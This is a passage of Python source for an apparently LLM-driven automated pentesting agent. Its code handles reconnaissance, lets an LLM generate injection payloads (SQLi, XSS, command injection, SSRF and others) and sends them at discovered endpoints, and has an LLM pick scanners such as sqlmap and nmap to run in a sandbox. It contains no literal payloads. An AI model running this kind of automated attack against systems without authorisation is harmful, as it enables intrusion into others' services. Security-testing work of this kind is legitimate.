                            self.recon.endpoints.append({"url": surl, "method": "GET"})
                            await self._endpoint_queue.put({"url": surl})
                    if sitemap_urls:
                        await self.log("info", f"  [DEEP RECON] Sitemap: {len(sitemap_urls)} URLs")

                    # Parse robots.txt (now returns tuple: paths, sitemap_urls)
                    robots_result = await self.deep_recon.parse_robots(self.target)
                    if isinstance(robots_result, tuple):
                        robots_paths, robots_sitemaps = robots_result
                    else:
                        robots_paths, robots_sitemaps = robots_result or [], []
                    for rurl in (robots_paths or []):
                        if rurl and rurl.startswith("http"):
                            self.recon.endpoints.append({"url": rurl, "method": "GET"})
                            await self._endpoint_queue.put({"url": rurl})
                    if robots_paths:
                        await self.log("info", f"  [DEEP RECON] Robots.txt: {len(robots_paths)} paths")

                    # API enumeration (Swagger/OpenAPI/GraphQL discovery)
                    api_schema = await self.deep_recon.enumerate_api(
                        self.target, self.recon.technologies
                    )
                    if api_schema:
                        for ep_info in getattr(api_schema, "endpoints", []):
                            if isinstance(ep_info, dict):
                                ep_path = ep_info.get("url") or ep_info.get("path", "")
                                if ep_path:
                                    full_url = urljoin(self.target, ep_path)
                                    self.recon.api_endpoints.append(full_url)
                                    ep_method = ep_info.get("method", "GET")
                                    ep_params = ep_info.get("params", [])
                                    self.recon.endpoints.append({
                                        "url": full_url, "method": ep_method, "params": ep_params
                                    })
                                    await self._endpoint_queue.put({
                                        "url": full_url, "method": ep_method, "params": ep_params
                                    })
                        if api_schema.endpoints:
                            await self.log("info", f"  [DEEP RECON] API schema ({api_schema.source}): "
                                           f"{len(api_schema.endpoints)} endpoints")

                    # JS file analysis (enhanced: source maps, parameters, more patterns)
                    if self.recon.js_files:
                        js_result = await self.deep_recon.crawl_js_files(
                            self.target, self.recon.js_files[:30]
                        )
                        if js_result:
                            for js_ep in getattr(js_result, "endpoints", []):
                                if js_ep:
                                    full_url = urljoin(self.target, js_ep)
                                    self.recon.endpoints.append({"url": full_url})
                                    await self._endpoint_queue.put({"url": full_url})
                            # Log source map routes
                            if js_result.source_map_routes:
                                await self.log("info", f"  [DEEP RECON] Source maps: "
                                               f"{len(js_result.source_map_routes)} routes from .map files")
                            # Store discovered JS parameters
                            if js_result.parameters:
                                for param_ep, params in js_result.parameters.items():
                                    for p in params:
                                        if p not in self.recon.parameters:
                                            self.recon.parameters[p] = None
                            if js_result.endpoints:
                                await self.log("info", f"  [DEEP RECON] JS analysis: "
                                               f"{len(js_result.endpoints)} endpoints, "
                                               f"{len(js_result.api_keys)} keys, "
                                               f"{len(js_result.internal_urls)} internal URLs")
                            # Store discovered secrets/keys for reporting
                            if js_result.api_keys:
                                for key in js_result.api_keys:
                                    await self.log("info", f"  [DEEP RECON] Found API key: {key[:8]}...{key[-4:]}")

                    # Framework-specific endpoint discovery
                    try:
                        from backend.core.deep_recon import EndpointInfo
                        fw_endpoints = await self.deep_recon.discover_framework_endpoints(
                            self.target, self.recon.technologies
                        )
                        for fw_ep in (fw_endpoints or []):
                            if isinstance(fw_ep, EndpointInfo):
                                self.recon.endpoints.append({"url": fw_ep.url, "method": fw_ep.method})
                                await self._endpoint_queue.put({
                                    "url": fw_ep.url, "method": fw_ep.method,
                                    "source": fw_ep.source, "ai_priority": fw_ep.priority >= 7,
                                })
                        if fw_endpoints:
                            await self.log("info", f"  [DEEP RECON] Framework discovery: "
                                           f"{len(fw_endpoints)} live endpoints")
                    except Exception as e:
                        await self.log("debug", f"  [DEEP RECON] Framework discovery error: {e}")

                    # API pattern fuzzing (infer endpoints from known patterns)
                    try:
                        known_urls = [ep["url"] if isinstance(ep, dict) else str(ep)
                                      for ep in self.recon.endpoints if ep]
                        fuzzed = await self.deep_recon.fuzz_api_patterns(self.target, known_urls)
                        for fz_ep in (fuzzed or []):
                            if isinstance(fz_ep, EndpointInfo):
                                self.recon.endpoints.append({"url": fz_ep.url, "method": fz_ep.method})
                                await self._endpoint_queue.put({"url": fz_ep.url})
                        if fuzzed:
                            await self.log("info", f"  [DEEP RECON] API fuzzing: "
                                           f"{len(fuzzed)} inferred endpoints alive")
                    except Exception as e:
                        await self.log("debug", f"  [DEEP RECON] API fuzzing error: {e}")

                    new_eps = len(self.recon.endpoints) - prev_ep_count
                    if new_eps > 0:
                        await self.log("info", f"  [DEEP RECON] Total: {new_eps} new endpoints discovered")
                except Exception as e:
                    await self.log("debug", f"  [DEEP RECON] Error: {e}")

            # ── Phase 7: Banner Analysis (version → vulnerability mapping) ──
            if self.banner_analyzer:
                try:
                    version_infos = []
                    # Extract version from technologies
                    for tech in self.recon.technologies:
                        if "/" in tech and not tech.startswith("WAF:"):
                            parts = tech.split("/", 1)
                            version_infos.append({
                                "software": parts[0].strip().lower(),
                                "version": parts[1].strip(),
                            })
                    if version_infos:
                        banner_findings = self.banner_analyzer.analyze(version_infos)
                        for bf in (banner_findings or []):
                            await self.log("info", f"  [BANNER] {getattr(bf, 'software', '?')} "
                                           f"{getattr(bf, 'version', '?')}: "
                                           f"{getattr(bf, 'cve', 'EOL/known vuln')}")
                except Exception as e:
                    await self.log("debug", f"  [BANNER] Analysis error: {e}")

            # ── Phase 8: Site Architecture Analysis ──
            if HAS_SITE_ANALYZER and self.site_analyzer and not self.is_cancelled():
                try:
                    await self.log("info", "  [SITE ANALYZER] Crawling site for architecture analysis...")
                    mirror = await self.site_analyzer.crawl_and_download(
                        self.target, session=self.session, max_pages=30
                    )
                    if mirror and mirror.total_pages > 0:
                        await self.log("info", f"  [SITE ANALYZER] Crawled {mirror.total_pages} pages, "
                                       f"{mirror.total_js_files} JS files")

                        # Add discovered forms to form inventory
                        for form_entry in mirror.forms_inventory:
                            ep = {"url": form_entry["action"], "method": form_entry["method"]}
                            if ep not in self.recon.endpoints:
                                self.recon.endpoints.append(ep)
                                await self._endpoint_queue.put(ep)

                        # JS sink analysis for DOM XSS targets
                        all_sinks = []
                        for js_url, js_content in mirror.js_files.items():
                            sinks = self.site_analyzer.analyze_js_sinks(js_content, js_url)
                            all_sinks.extend(sinks)
                        if all_sinks:
                            high_risk = [s for s in all_sinks if s.risk == "high"]
                            await self.log("info", f"  [SITE ANALYZER] Found {len(all_sinks)} JS sinks "
                                           f"({len(high_risk)} high-risk)")
                            # Store sink info for later DOM XSS testing
                            self.recon.js_sinks = all_sinks

                        # AI architecture analysis (if budget allows)
                        if self.llm.is_available():
                            markdown = self.site_analyzer.convert_to_markdown(mirror)
                            analysis = await self.site_analyzer.ai_analyze_architecture(
                                markdown, self.llm, self.token_budget
                            )
                            if analysis and analysis.raw_analysis:
                                self._site_architecture = analysis
                                if analysis.logic_flaw_candidates:
                                    await self.log("info", f"  [SITE ANALYZER] {len(analysis.logic_flaw_candidates)} "
                                                   f"logic flaw candidates identified")
                                if analysis.zero_day_hypotheses:
                                    await self.log("info", f"  [SITE ANALYZER] {len(analysis.zero_day_hypotheses)} "
                                                   f"zero-day hypotheses generated")
                except Exception as e:
                    await self.log("debug", f"  [SITE ANALYZER] Error: {e}")

            # ── Phase 9: AI Endpoint Analysis ──
            # After all recon, ask AI to analyze the full attack surface
            if self.llm.is_available() and self.recon.endpoints and not self.is_cancelled():
                try:
                    await self.log("info", "  [STREAM 1] AI analyzing attack surface...")
                    recon_analysis = await self._ai_analyze_recon()
                    if recon_analysis:
                        # Feed high-priority endpoints back into queue for junior testing
                        for hp in recon_analysis.get("high_priority_endpoints", [])[:10]:
                            hp_url = hp.get("url", "")
                            if hp_url and hp_url.startswith("http"):
                                await self._endpoint_queue.put({
                                    "url": hp_url,
                                    "ai_priority": True,
                                    "suggested_vulns": hp.get("suggested_vuln_types", []),
                                })
                        # Probe hidden endpoints the AI suggests
                        for hidden in recon_analysis.get("hidden_endpoints_to_probe", [])[:5]:
                            hurl = hidden.get("url", "")
                            if hurl:
                                if not hurl.startswith("http"):
                                    hurl = urljoin(self.target, hurl)
                                try:
                                    probe_resp = await self._make_request(hurl)
                                    if probe_resp and probe_resp.get("status", 0) not in (0, 404):
                                        self.recon.endpoints.append({"url": hurl, "method": "GET"})
                                        await self._endpoint_queue.put({"url": hurl})
                                        await self.log("info", f"    [AI RECON] Hidden endpoint found: {hurl} "
                                                       f"(status {probe_resp.get('status', '?')})")
                                except Exception:
                                    pass
                        # Store tech-vuln mappings for later deep testing
                        tech_vulns = recon_analysis.get("tech_vuln_mapping", [])
                        if tech_vulns:
                            tech_recommended = []
                            for tv in tech_vulns:
                                tech_recommended.extend(tv.get("vuln_types", []))
                            if tech_recommended:
                                self._playbook_recommended_types = list(dict.fromkeys(
                                    tech_recommended + self._playbook_recommended_types
                                ))
                        # Log summary
                        hp_count = len(recon_analysis.get("high_priority_endpoints", []))
                        hidden_count = len(recon_analysis.get("hidden_endpoints_to_probe", []))
                        chain_count = len(recon_analysis.get("attack_chains", []))
                        await self.log("info", f"    [AI RECON] Analysis: {hp_count} high-priority EPs, "
                                       f"{hidden_count} hidden probes, {chain_count} attack chains")
                except Exception as e:
                    await self.log("debug", f"  [AI RECON] Analysis error: {e}")

            ep_count = len(self.recon.endpoints)
            param_count = sum(len(v) if isinstance(v, list) else 1 for v in self.recon.parameters.values())
            tech_count = len(self.recon.technologies)
            await self.log("info", f"  [STREAM 1] Recon complete: "
                           f"{ep_count} endpoints, {param_count} params, {tech_count} techs")
        except Exception as e:
            await self.log("warning", f"  [STREAM 1] Recon error: {e}")
        finally:
            self._recon_complete.set()

    async def _ai_analyze_recon(self) -> Dict:
        """AI analysis of reconnaissance results for Stream 1.

        Analyzes all discovered endpoints, parameters, forms, and technologies
        to identify high-priority targets and hidden attack surfaces.
        """
        try:
            from backend.core.vuln_engine.ai_prompts import get_recon_analysis_prompt
        except ImportError:
            return {}

        endpoints_str = "\n".join(
            f"  - [{ep.get('method', 'GET')}] {ep.get('url', ep) if isinstance(ep, dict) else ep}"
            for ep in self.recon.endpoints[:30]
        )
        forms_str = "\n".join(
            f"  - {f.get('action', '?')} [{f.get('method', 'GET')}] "
            f"inputs: {', '.join(f.get('inputs', []))}"
            for f in self.recon.forms[:15]
        )
        tech_str = ", ".join(self.recon.technologies[:20])
        params_str = "\n".join(
            f"  - {url}: {', '.join(p) if isinstance(p, list) else str(p)}"
            for url, p in list(self.recon.parameters.items())[:15]
        )
        js_str = "\n".join(f"  - {js}" for js in self.recon.js_files[:10])
        api_str = "\n".join(f"  - {api}" for api in self.recon.api_endpoints[:15])

        prompt = get_recon_analysis_prompt(
            target=self.target,
            endpoints=endpoints_str,
            forms=forms_str,
            technologies=tech_str,
            parameters=params_str,
            js_files=js_str,
            api_endpoints=api_str,
        )

        try:
            resp_text = await self.llm.generate(
                prompt,
                system=self._get_enhanced_system_prompt("strategy")
            )
            if not resp_text or len(resp_text.strip()) < 20:
                await self.log("debug", "  [AI RECON] Empty or too short response from LLM")
                return {}

            # Try to find JSON in response
            json_match = re.search(r'```(?:json)?\s*(\{[\s\S]*?\})\s*```', resp_text)
            if json_match:
                return json.loads(json_match.group(1))

            # Try bare JSON
            start = resp_text.find('{')
            end = resp_text.rfind('}')
            if start >= 0 and end > start:
                return json.loads(resp_text[start:end + 1])

            await self.log("debug", "  [AI RECON] No JSON found in LLM response")
            return {}
        except json.JSONDecodeError as e:
            await self.log("debug", f"  [AI RECON] JSON parse error: {e}")
            return {}
        except Exception as e:
            await self.log("debug", f"  [AI RECON] Analysis error: {e}")
            return {}

    # ── Stream 2: Junior Pentester ──

    async def _stream_junior_pentest(self):
        """Stream 2: Junior pentester — immediate testing + queue consumer.

        Starts testing the target URL right away without waiting for recon.
        Then consumes endpoints from the queue as recon discovers them.
        """
        try:
            await self.log("info", "[STREAM 2] Junior pentester starting")
            await self.log("info", "[PHASE] Stream 2: Junior Pentester | Objective: Test priority vuln types on all endpoints | Success: payloads tested with validation")

            # Priority vulnerability types to test immediately
            priority_types = [
                "xss_reflected", "sqli_error", "sqli_blind", "command_injection",
                "lfi", "path_traversal", "open_redirect", "ssti",
                "crlf_injection", "ssrf", "xxe",
            ]

            # Use master plan priorities if available (from pre-stream AI planning)
            if hasattr(self, '_master_plan') and self._master_plan:
                master_priorities = self._master_plan.get("priority_vuln_types", [])
                immediate = self._master_plan.get("testing_strategy", {}).get("immediate_tests", [])
                if master_priorities or immediate:
                    # Merge: immediate first, then master priorities, then defaults
                    merged = list(dict.fromkeys(
                        [t for t in immediate if t in self.VULN_TYPE_MAP] +
                        [t for t in master_priorities if t in self.VULN_TYPE_MAP] +
                        priority_types
                    ))
                    priority_types = merged
                    await self.log("info", f"  [STREAM 2] Using master plan priorities: "
                                   f"{', '.join(priority_types[:8])}")

            # Ask AI for initial prioritization (quick call)
            if self.llm.is_available() and not (hasattr(self, '_master_plan') and self._master_plan.get("priority_vuln_types")):
                try:
                    # Playbook: gather category overview for smarter prioritization
                    playbook_hint = ""
                    if HAS_PLAYBOOK:
                        try:
                            summary = get_playbook_summary()
                            category_list = ", ".join(f"{cat}({len(vts)})" for cat, vts in summary.items())
                            playbook_hint = (
                                f"\nPlaybook categories available: {category_list}\n"
                                f"Use these exact vuln type names from the playbook.\n"
                            )
                        except Exception:
                            pass
                    junior_prompt = (
                        f"You are a junior penetration tester. Target: {self.target}\n"
                        f"{playbook_hint}"
                        f"What are the 5-10 most likely vulnerability types to test first?\n"
                        f"Respond ONLY with JSON: {{\"test_types\": [\"type1\", \"type2\", ...]}}"
                    )
                    ai_resp = await self.llm.generate(
                        junior_prompt,
                        system=self._get_enhanced_system_prompt("strategy")
                    )
                    start_idx = ai_resp.index('{')
                    end_idx = ai_resp.rindex('}') + 1
                    data = json.loads(ai_resp[start_idx:end_idx])
                    ai_types = [t for t in data.get("test_types", [])
                                if t in self.VULN_TYPE_MAP]
                    if ai_types:
                        priority_types = list(dict.fromkeys(ai_types + priority_types))
                        await self.log("info", f"  [STREAM 2] AI prioritized: {', '.join(ai_types[:5])}")
                except Exception:
                    pass  # Use defaults

            # ── IMMEDIATE: Test target URL with priority vulns ──
            await self.log("info", f"  [STREAM 2] Immediate testing: "
                           f"{len(priority_types[:15])} priority types on target")
            for vtype in priority_types[:15]:
                if self.is_cancelled():
                    return
                self._junior_tested_types.add(vtype)
                try:
                    await self._junior_test_single(self.target, vtype)
                except Exception:
                    pass
            await self._update_progress(30, "Junior: initial tests done")

            # ── QUEUE CONSUMER: Test endpoints as recon discovers them ──
            await self.log("info", "  [STREAM 2] Consuming endpoint queue from recon")
            tested_urls = {self.target}
            while True:
                if self.is_cancelled():
                    return
                try:
                    ep = await asyncio.wait_for(self._endpoint_queue.get(), timeout=3.0)
                    url = ep.get("url", ep) if isinstance(ep, dict) else str(ep)
                    if url and url not in tested_urls and url.startswith("http"):
                        tested_urls.add(url)

                        # Use endpoint classifier to determine how many types to test
                        ep_types = priority_types[:5]  # default
                        if self.endpoint_classifier:
                            try:
                                profile = self.endpoint_classifier.classify(url)
                                test_budget = self.endpoint_classifier.get_endpoint_test_budget(
                                    profile.risk_score
                                )
                                # Merge endpoint-specific vulns with priority types
                                ep_types = list(dict.fromkeys(
                                    profile.priority_vulns[:test_budget] + priority_types[:5]
                                ))[:test_budget]
                            except Exception:
                                pass

                        # Use strategy adapter to skip dead endpoints
                        if self.strategy:
                            skip, reason = self.strategy.should_skip_endpoint_enhanced(url)
                            if skip:
                                continue

                        for vtype in ep_types:
                            if self.is_cancelled():
                                return
                            try:
                                await self._junior_test_single(url, vtype)
                            except Exception:
                                pass
                except asyncio.TimeoutError:
                    if self._recon_complete.is_set() and self._endpoint_queue.empty():
                        break
                    continue

            await self.log("info", f"  [STREAM 2] Junior complete: "
                           f"{self._stream_findings_count} findings from {len(tested_urls)} URLs")
        except Exception as e:
            await self.log("warning", f"  [STREAM 2] Junior error: {e}")

    async def _junior_test_single(self, url: str, vuln_type: str):
        """Quick single-type test (max 3 payloads) for junior pentester stream."""
        if self.is_cancelled():
            return

        # Pre-load playbook context for this vuln type (used by downstream AI calls)
        if HAS_PLAYBOOK:
            try:
                entry = get_playbook_entry(vuln_type)
                if entry:
                    anti_fp = get_anti_fp_rules(vuln_type)
                    verification = get_verification_checklist(vuln_type)
                    ctx = f"\n--- PLAYBOOK ({vuln_type}) ---\n"
                    ctx += f"Overview: {entry.get('overview', '')[:200]}\n"
                    if anti_fp:
                        ctx += f"Anti-FP: {'; '.join(anti_fp[:2])}\n"
                    if verification:
                        ctx += f"Verify: {'; '.join(verification[:2])}\n"
                    self._current_playbook_context = ctx
                else:
                    self._current_playbook_context = ""
            except Exception:
                self._current_playbook_context = ""

        # Get endpoint params from recon if available
        parsed = urlparse(url)
        params_raw = self.recon.parameters.get(url, {})
        if isinstance(params_raw, dict):
            params = list(params_raw.keys())[:3]
        elif isinstance(params_raw, list):
            params = params_raw[:3]
        else:
            params = []
        if not params:
            params = list(parse_qs(parsed.query).keys())[:3]
        if not params:
            params = ["id", "q", "search"]  # Defaults

        # Use param analyzer to rank parameters by attack potential
        if self.param_analyzer and params:
            try:
                param_dict = {p: "" for p in params}
                ranked = self.param_analyzer.rank_parameters(param_dict)
                # Re-order params by risk score
                params = [name for name, score, vulns in ranked][:3]
            except Exception:
                pass

        method = "GET"
        injection_config = self.VULN_INJECTION_POINTS.get(vuln_type, {"point": "parameter"})
        inj_point = injection_config.get("point", "parameter")
        # For "both" types, just test params in junior mode
        if inj_point == "both":
            inj_point = "parameter"

        # ── AI-POWERED PAYLOAD GENERATION ──
        # Ask AI to generate context-aware payloads instead of using hardcoded ones
        ai_tests = []
        if self.llm.is_available():
            try:
                from backend.core.vuln_engine.ai_prompts import get_junior_ai_test_prompt

                tech_ctx = ", ".join(self.recon.technologies[:10])
                waf_info = ""
                if hasattr(self, '_waf_result') and self._waf_result and self._waf_result.detected_wafs:
                    waf_info = ", ".join(w.name for w in self._waf_result.detected_wafs)

                # Distill master plan context for this vuln type
                master_ctx = ""
                if hasattr(self, '_master_plan') and self._master_plan:
                    strategy = self._master_plan.get("testing_strategy", {})
                    if vuln_type in self._master_plan.get("priority_vuln_types", []):
                        master_ctx = f"This vuln type is PRIORITY per master plan."
                    bypass = strategy.get("bypass_strategies", [])
                    if bypass:
                        master_ctx += f" Bypass strategies: {'; '.join(bypass[:2])}"

                prompt = get_junior_ai_test_prompt(
                    url=url, vuln_type=vuln_type, params=params,
                    method=method, tech_context=tech_ctx,
                    master_plan_context=master_ctx, waf_info=waf_info,
                )
                ai_resp = await self.llm.generate(
                    prompt,
                    system=self._get_enhanced_system_prompt("testing", vuln_type)
                )
                start_idx = ai_resp.index('{')
                end_idx = ai_resp.rindex('}') + 1
                ai_data = json.loads(ai_resp[start_idx:end_idx])
                ai_tests = ai_data.get("tests", [])[:5]
            except Exception:
                pass  # Fall back to hardcoded payloads

        # Execute AI-generated tests
        if ai_tests:
            for test in ai_tests:
                if self.is_cancelled():
                    return
                t_param = test.get("param", params[0] if params else "id")
                t_payload = test.get("payload", "")
                t_method = test.get("method", method)
                t_inj = test.get("injection_point", inj_point)
                t_header = test.get("header_name", "")
                if not t_payload:
                    continue
                if self.memory.was_tested(url, t_param, vuln_type):
                    continue

                test_resp = await self._make_request_with_injection(
                    url, t_method, t_payload,
                    injection_point=t_inj,
                    param_name=t_param,
                    header_name=t_header,
                )
                if not test_resp:
                    continue

                is_vuln, evidence = await self._verify_vulnerability(
                    vuln_type, t_payload, test_resp
                )
                if is_vuln:
                    finding = await self._judge_finding(
                        vuln_type, url, t_param, t_payload, evidence, test_resp,
                        injection_point=t_inj
                    )
                    if finding:
                        await self._add_finding(finding)
                        self._stream_findings_count += 1
                        return

                self.memory.record_test(url, t_param, vuln_type, [t_payload], False)
        else:
            # ── FALLBACK: Hardcoded payloads when AI is unavailable ──
            payloads = self._get_payloads(vuln_type)[:3]
            if not payloads:
                return

            for param in params[:2]:
                if self.is_cancelled():
                    return
                if self.memory.was_tested(url, param, vuln_type):
                    continue
                for payload in payloads:
                    if self.is_cancelled():
                        return
                    header_name = ""
                    if inj_point == "header":
                        headers_list = injection_config.get("headers", ["X-Forwarded-For"])
                        header_name = headers_list[0] if headers_list else "X-Forwarded-For"

                    test_resp = await self._make_request_with_injection(
                        url, method, payload,
                        injection_point=inj_point,
                        param_name=param,
                        header_name=header_name,
                    )
                    if not test_resp:
                        continue

                    is_vuln, evidence = await self._verify_vulnerability(
                        vuln_type, payload, test_resp
                    )
                    if is_vuln:
                        finding = await self._judge_finding(
                            vuln_type, url, param, payload, evidence, test_resp,
                            injection_point=inj_point
                        )
                        if finding:
                            await self._add_finding(finding)
                            self._stream_findings_count += 1
                            return

                    self.memory.record_test(url, param, vuln_type, [payload], False)

    # ── Stream 3: Dynamic Tool Runner ──

    async def _stream_tool_runner(self):
        """Stream 3: Dynamic tool execution (sandbox + AI-decided tools).

        Runs core tools (Nuclei/Naabu) immediately, then waits for recon
        to complete before asking AI which additional tools to run.
        """
        try:
            await self.log("info", "[STREAM 3] Tool runner starting")
            await self.log("info", "[PHASE] Stream 3: Tool Runner | Objective: Execute security tools in Kali sandbox | Success: tools complete with exit_code=0")

            # Run core tools immediately (don't wait for recon)
            await self._run_sandbox_scan()  # Nuclei + Naabu

            if self.is_cancelled():
                return

            # Wait for recon to have tech data before AI tool decisions
            try:
                await asyncio.wait_for(self._recon_complete.wait(), timeout=120)
            except asyncio.TimeoutError:
                await self.log("warning", "  [STREAM 3] Timeout waiting for recon, proceeding")

            if self.is_cancelled():
                return

            # AI-driven tool selection based on discovered tech stack
            tool_decisions = await self._ai_decide_tools()

            if tool_decisions:
                await self.log("info", f"  [STREAM 3] AI selected "
                               f"{len(tool_decisions)} additional tools")
                for decision in tool_decisions[:5]:
                    if self.is_cancelled():
                        return
                    await self._execute_dynamic_tool(decision)

            await self.log("info", "  [STREAM 3] Tool runner complete")
        except Exception as e:
            await self.log("error", f"[PHASE FAIL] Stream 3 Tool Runner: {e}")
            await self.log("info", "[ALTERNATIVE] Continuing with AI-only testing (Streams 1 + 2). "
                           "Sandbox tools skipped — findings rely on payload injection + AI analysis.")
        finally:
            self._tools_complete.set()

    # ── AI Tool Decision Engine ──

    async def _ai_decide_tools(self) -> List[Dict]:
        """Ask AI which additional tools to run based on discovered tech stack."""
        if not self.llm.is_available():
            return []

        tech_str = ", ".join(self.recon.technologies[:20]) or "unknown"
        endpoints_preview = "\n".join(
            f"  - {ep.get('url', ep) if isinstance(ep, dict) else ep}"
            for ep in (self.recon.endpoints[:15]
                       if self.recon.endpoints else [{"url": self.target}])
        )

        prompt = f"""You are a senior penetration tester planning tool usage.

Target: {self.target}
Technologies detected: {tech_str}
Endpoints discovered:
{endpoints_preview}

Available tools in our sandbox (choose from these ONLY):
- nmap (network scanner with scripts)
- httpx (HTTP probing + tech detection)
- subfinder (subdomain enumeration)
- katana (web crawler)
- dalfox (XSS scanner)
- nikto (web server scanner)
- sqlmap (SQL injection automation)
- ffuf (web fuzzer)
- gobuster (directory brute-forcer)
- dnsx (DNS toolkit)
- whatweb (technology fingerprinting)
- wafw00f (WAF detection)
- arjun (parameter discovery)

NOTE: nuclei and naabu already ran. Pick 1-3 MOST USEFUL additional tools.
For each tool, provide the exact command-line arguments for {self.target}.

Respond ONLY with a JSON array:
[{{"tool": "tool_name", "args": "-flags {self.target}", "reason": "brief reason"}}]"""

        try:
            resp = await self.llm.generate(
                prompt,
                system=self._get_enhanced_system_prompt("strategy")
            )
            start = resp.index('[')
            end = resp.rindex(']') + 1
            decisions = json.loads(resp[start:end])
            # Validate tool names against allowed set
            allowed = {"nmap", "httpx", "subfinder", "katana", "dalfox", "nikto",
                       "sqlmap", "ffuf", "gobuster", "dnsx", "whatweb", "wafw00f", "arjun"}
            validated = [d for d in decisions
                         if isinstance(d, dict) and d.get("tool") in allowed]
            return validated[:5]
        except Exception as e:
            await self.log("info", f"  [STREAM 3] AI tool selection skipped: {e}")
            return []

    async def _execute_dynamic_tool(self, decision: Dict):
        """Execute an AI-selected tool in the sandbox."""
        tool_name = decision.get("tool", "")
        args = decision.get("args", "")
        reason = decision.get("reason", "")

        await self.log("info", f"  [TOOL] Running {tool_name}: {reason}")

        try:
            if not HAS_SANDBOX:
                await self.log("info", f"  [TOOL] Sandbox unavailable, skipping {tool_name}")
                return

            if not hasattr(self, '_sandbox') or self._sandbox is None:
                self._sandbox = await get_sandbox(scan_id=self.scan_id)

            if not self._sandbox.is_available:
                await self.log("info", f"  [TOOL] Sandbox not running, skipping {tool_name}")
                return

            # Execute with safety timeout
            result = await self._sandbox.run_tool(tool_name, args, timeout=180)

            # Track tool execution with telemetry
            _dyn_task_id = getattr(result, 'task_id', None) or hashlib.md5(f"{tool_name}-{time.time()}".encode()).hexdigest()[:8]
            self.tool_executions.append({
                "tool": tool_name,
                "command": f"{tool_name} {args}",
                "reason": reason,
                "duration": result.duration_seconds,
                "exit_code": result.exit_code,
                "findings_count": len(result.findings) if result.findings else 0,
                "stdout_preview": (result.stdout or "")[:500],
                "stderr_preview": (result.stderr or "")[:500],
                "task_id": _dyn_task_id,
                "container_id": getattr(self._sandbox, 'container_id', None) if self._sandbox else None,
                "container_name": getattr(self._sandbox, 'container_name', None) if self._sandbox else None,
                "image_digest": getattr(self._sandbox, 'image_digest', None) if self._sandbox else None,
                "start_time": getattr(result, 'started_at', None),
                "end_time": getattr(result, 'completed_at', None),
            })
            await self.log("info", f"[CONTAINER] task={_dyn_task_id} tool={tool_name} "
                           f"exit={result.exit_code} duration={result.duration_seconds}s "
                           f"container={getattr(self._sandbox, 'container_name', 'N/A')}")

            # Process findings from tool
            if result.findings:
                await self.log("info", f"  [TOOL] {tool_name}: "
                               f"{len(result.findings)} findings")
                for tool_finding in result.findings[:20]:
                    await self._process_tool_finding(tool_finding, tool_name)
            else:
                await self.log("info", f"  [TOOL] {tool_name}: completed "
                               f"({result.duration_seconds:.1f}s, no findings)")

            # ── AI ANALYSIS of tool output ──
            # Ask AI to analyze raw tool output for hidden insights
            tool_output = (result.stdout or "") + "\n" + (result.stderr or "")
            if self.llm.is_available() and tool_output.strip():
                try:
                    ai_analysis = await self._ai_analyze_tool_output(
                        tool_name, tool_output
                    )
                    if ai_analysis:
                        # Process AI-identified real findings
                        for af in ai_analysis.get("real_findings", [])[:5]:
                            if af.get("confidence") in ("high", "medium"):
                                vtype = af.get("vulnerability_type", "vulnerability")
                                endpoint = af.get("endpoint", self.target)
                                if not self.memory.has_finding_for(vtype, endpoint, ""):
                                    ai_tool_finding = {
                                        "title": af.get("title", f"AI-{tool_name} finding"),
                                        "severity": af.get("severity", "medium"),
                                        "vulnerability_type": vtype,
                                        "affected_endpoint": endpoint,
                                        "evidence": af.get("evidence", ""),
                                    }
                                    await self._process_tool_finding(ai_tool_finding, tool_name)

                        # Queue follow-up tests for junior stream
                        for ft in ai_analysis.get("follow_up_tests", [])[:3]:
                            ft_url = ft.get("endpoint", "")
                            if ft_url and ft_url.startswith("http") and hasattr(self, '_endpoint_queue'):
                                await self._endpoint_queue.put({
                                    "url": ft_url,
                                    "ai_priority": True,
                                    "suggested_vulns": [ft.get("vuln_type", "")],
                                })

                        insights = ai_analysis.get("target_insights", "")
                        if insights:
                            await self.log("info", f"    [AI TOOL] {tool_name} insights: {insights[:120]}")
                except Exception as e:
                    await self.log("debug", f"    [AI TOOL] Analysis error for {tool_name}: {e}")

            # Feed tool output back into recon context
            self._ingest_tool_results(tool_name, result)

        except Exception as e:
            await self.log("warning", f"  [TOOL] {tool_name} failed: {e}")

    async def _ai_analyze_tool_output(self, tool_name: str, tool_output: str) -> Dict:
        """AI analysis of security tool output for Stream 3.

        Analyzes raw tool stdout/stderr to identify real findings, filter noise,
        and suggest follow-up manual tests.
        """
        try:
            from backend.core.vuln_engine.ai_prompts import get_tool_analysis_prompt
        except ImportError:
            return {}

        # Build existing findings summary to avoid duplicates
        existing_summary = ""
        if self.findings:
            existing_summary = "\n".join(
                f"  - [{f.severity}] {f.vulnerability_type}: {f.affected_endpoint[:60]}"
                for f in self.findings[:15]
            )

        prompt = get_tool_analysis_prompt(
            tool_name=tool_name,
            tool_output=tool_output[:4000],
            target=self.target,
            existing_findings_summary=existing_summary,
        )

        try:
            resp_text = await self.llm.generate(
                prompt,
                system=self._get_enhanced_system_prompt("interpretation")
            )
            start = resp_text.index('{')
            end = resp_text.rindex('}') + 1
            return json.loads(resp_text[start:end])
        except Exception:
            return {}

    def _ingest_tool_results(self, tool_name: str, result):
        """Feed tool output back into recon context for richer analysis."""
        if not result or not result.findings:
            return

        if tool_name == "httpx":
            for f in result.findings:
                if f.get("url"):
                    self.recon.endpoints.append({
                        "url": f["url"],
                        "status": f.get("status_code", 0)
                    })
                for tech in f.get("technologies", []):
                    if tech not in self.recon.technologies:
                        self.recon.technologies.append(tech)
        elif tool_name == "subfinder":
            for f in result.findings:
                sub = f.get("subdomain", "")
                if sub and sub not in self.recon.subdomains:
                    self.recon.subdomains.append(sub)
        elif tool_name in ("katana", "gobuster", "ffuf"):
            for f in result.findings:
                url = f.get("url", f.get("path", ""))
                if url:
                    self.recon.endpoints.append({
                        "url": url,
                        "status": f.get("status_code", 200)
                    })
        elif tool_name == "wafw00f" and result.stdout:
            waf_info = f"WAF: {result.stdout.strip()[:100]}"
            if waf_info not in self.recon.technologies:
                self.recon.technologies.append(waf_info)
        elif tool_name == "arjun":
            for f in result.findings:
                url = f.get("url", self.target)
                params = f.get("params", [])
                if url not in self.recon.parameters:
                    self.recon.parameters[url] = params
                elif isinstance(self.recon.parameters[url], list):
                    self.recon.parameters[url].extend(params)
        elif tool_name == "whatweb":
            for f in result.findings:
                for tech in f.get("technologies", []):
                    if tech not in self.recon.technologies:
                        self.recon.technologies.append(tech)

    async def _process_tool_finding(self, tool_finding: Dict, tool_name: str):
        """Convert a tool-generated finding into an agent Finding."""
        title = tool_finding.get("title", f"{tool_name} finding")
        severity = tool_finding.get("severity", "info")
